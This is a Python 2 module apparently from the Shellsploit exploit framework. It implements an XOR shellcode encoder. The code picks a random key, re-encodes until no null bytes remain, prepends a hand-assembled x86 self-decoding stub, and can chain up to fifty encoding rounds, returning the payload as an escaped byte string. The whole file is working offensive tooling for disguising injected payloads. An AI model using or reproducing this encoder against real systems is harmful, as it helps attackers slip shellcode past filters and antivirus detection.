#------------------Bombermans Team---------------------------------# 
#Author  : B3mB4m
#Concat  : b3mb4m@protonmail.com
#Project : https://github.com/b3mb4m/Shellsploit
#LICENSE : https://github.com/b3mb4m/Shellsploit/blob/master/LICENSE
#------------------------------------------------------------------#

import sys
import re

sys.setrecursionlimit(9999)

def xorme( data):
	from random import randint
	xor = [hex(x) for x in range(20,256)][randint(0, len([hex(x) for x in range(20,256)])-1)]
	shellcode = ""
	for x in bytearray(data.decode("hex")) :	
		y = x^int(xor, 16)
		shellcode += '0x%02x,' %y

	padding = str(shellcode)+str(xor)
	shellcode  =  "EB095E8036"
	shellcode +=  str(xor).replace("0x", "")
	shellcode +=  "7408"
	shellcode +=  "46"
	shellcode +=  "EBF8"
	shellcode +=  "E8F2FFFFFF"
	shellcode +=  padding.replace("0x", "").replace(",", "")
	return shellcode


def start( shellcode):
	try:
		control = True
		while control == True:
			qe = re.findall("..?", xorme( shellcode))
			if "00" in qe:
				qe = re.findall("..?", xorme( shellcode))
				control = True
			else:
				control = False
		return "".join(qe)
	except:
		print ("After roll 9999 times,payload generate failed.")
		sys.exit()


def prestart( data, roll=None):
	if roll == None or roll == 1:
		data = start(data) 
	elif roll > 50:
		return "Please do not use iteration more than 50 times ..."
	else:
		for x in range(int(roll)):
			data = start( data)

	qe = re.findall("..?", data)
	return "\\x"+"\\x".join(qe).lower()


